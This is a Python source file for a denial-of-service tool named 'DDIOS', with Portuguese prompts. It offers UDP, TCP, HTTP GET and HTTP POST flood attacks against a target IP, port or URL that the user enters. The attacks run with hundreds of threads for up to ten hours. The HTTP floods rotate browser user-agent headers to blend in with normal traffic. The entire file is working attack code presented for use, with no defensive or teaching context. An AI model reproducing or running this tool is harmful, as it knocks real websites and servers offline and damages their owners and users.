import threading
import datetime
import time
import random
import socket
import sys
import requests
from sys import stdout
import os

# Códigos de cores ANSI
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
RESET = "\033[0m"

def clear_terminal():
    print("\033c", end="")  # Limpa terminal

clear_terminal()

def print_banner():
    banner = f"""{MAGENTA}
░▒▓███████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓███████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
{RESET}"""
    print(banner)

class CountdownStats:
    def __init__(self, duration):
        self.end_time = datetime.datetime.now() + datetime.timedelta(seconds=duration)
        self.lock = threading.Lock()
        self.packets_sent = 0

    def add_packets(self, n):
        with self.lock:
            self.packets_sent += n

    def remaining(self):
        return max(0, int((self.end_time - datetime.datetime.now()).total_seconds()))

    def is_running(self):
        return datetime.datetime.now() < self.end_time

def countdown(stats: CountdownStats):
    while stats.is_running():
        stdout.write(f"\r{YELLOW}[*] Tempo restante: {stats.remaining()}s | Pacotes enviados: {stats.packets_sent} {RESET}")
        stdout.flush()
        time.sleep(1)
    print(f"\n{YELLOW}[*] Ataque finalizado!{RESET}")

def input_int(prompt, min_val=None, max_val=None):
    while True:
        try:
            val = int(input(f"{CYAN}{prompt}{RESET}").strip())
            if (min_val is not None and val < min_val) or (max_val is not None and val > max_val):
                print(f"{RED}Digite um número entre {min_val} e {max_val}.{RESET}")
                continue
            return val
        except:
            print(f"{RED}Entrada inválida, digite um número inteiro.{RESET}")

def udp_flood(target_ip, target_port, threads, duration):
    stats = CountdownStats(duration)

    def worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end = stats.end_time
        while datetime.datetime.now() < end:
            size = random.randint(512, 2048)
            data = random._urandom(size)
            try:
                sent = sock.sendto(data, (target_ip, target_port))
                stats.add_packets(1)
                time.sleep(random.uniform(0, 0.005))
            except:
                pass
        sock.close()

    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()

    countdown(stats)

def tcp_flood(target_ip, target_port, threads, duration):
    stats = CountdownStats(duration)

    def worker():
        end = stats.end_time
        while datetime.datetime.now() < end:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                for _ in range(10):
                    if not stats.is_running():
                        break
                    size = random.randint(512, 2048)
                    data = random._urandom(size)
                    sock.send(data)
                    stats.add_packets(1)
                    time.sleep(random.uniform(0, 0.01))
                sock.close()
            except:
                pass

    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()

    countdown(stats)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
    " Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko)"
    " Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)"
    " Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"
    " Version/16.5 Mobile/15E148 Safari/604.1",
]

accept_headers = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json, text/javascript, */*; q=0.01",
    "*/*"
]

def random_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": random.choice(accept_headers),
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
    }

def http_get_flood(url, threads, duration):
    stats = CountdownStats(duration)

    def worker():
        end = stats.end_time
        session = requests.Session()
        while datetime.datetime.now() < end:
            headers = random_headers()
            try:
                r = session.get(url, headers=headers, timeout=5)
                stats.add_packets(1)
                time.sleep(random.uniform(0, 0.02))
            except:
                pass

    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()

    countdown(stats)

def http_post_flood(url, threads, duration):
    stats = CountdownStats(duration)

    def worker():
        end = stats.end_time
        session = requests.Session()
        while datetime.datetime.now() < end:
            headers = random_headers()
            data = { "data": random._urandom(random.randint(16, 64)) }
            try:
                r = session.post(url, headers=headers, data=data, timeout=5)
                stats.add_packets(1)
                time.sleep(random.uniform(0, 0.02))
            except:
                pass

    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()

    countdown(stats)

def main():
    print_banner()
    while True:
        print(f"\n{BLUE}Escolha o tipo de ataque:{RESET}")
        print(f"{GREEN}[1]{RESET} UDP Flood Avançado")
        print(f"{GREEN}[2]{RESET} TCP Flood Avançado")
        print(f"{GREEN}[3]{RESET} HTTP GET Flood Avançado")
        print(f"{GREEN}[4]{RESET} HTTP POST Flood Avançado")
        print(f"{GREEN}[0]{RESET} Sair")

        choice = input(f"{CYAN}Opção: {RESET}").strip()
        if choice == "0":
            print(f"{YELLOW}Obrigado por ter utilizado o DDIOS, até logo...{RESET}")
            sys.exit(0)

        if choice in ["1", "2"]:
            ip = input(f"{CYAN}Digite o IP alvo: {RESET}").strip()
            port = input_int("Digite a porta alvo: ", 1, 65535)
            threads = input_int("Número de threads (recomendo <= 300): ", 1, 300)
            duration = input_int("Duração em segundos (máximo 36000): ", 1, 36000)
            print(f"\n{YELLOW}Iniciando ataque {'UDP' if choice=='1' else 'TCP'} flood em {ip}:{port} com {threads} threads por {duration}s...{RESET}\n")

            if choice == "1":
                udp_flood(ip, port, threads, duration)
            else:
                tcp_flood(ip, port, threads, duration)

        elif choice in ["3", "4"]:
            url = input(f"{CYAN}Digite a URL alvo (ex: https://exemplo.com): {RESET}").strip()
            threads = input_int("Número de threads (recomendo <= 150): ", 1, 150)
            duration = input_int("Duração em segundos (máximo 36000): ", 1, 36000)
            print(f"\n{YELLOW}Iniciando ataque HTTP {'GET' if choice=='3' else 'POST'} flood em {url} com {threads} threads por {duration}s...{RESET}\n")

            if choice == "3":
                http_get_flood(url, threads, duration)
            else:
                http_post_flood(url, threads, duration)

        else:
            print(f"{RED}Opção inválida! Tente novamente.{RESET}\n")

if __name__ == "__main__":
    main()
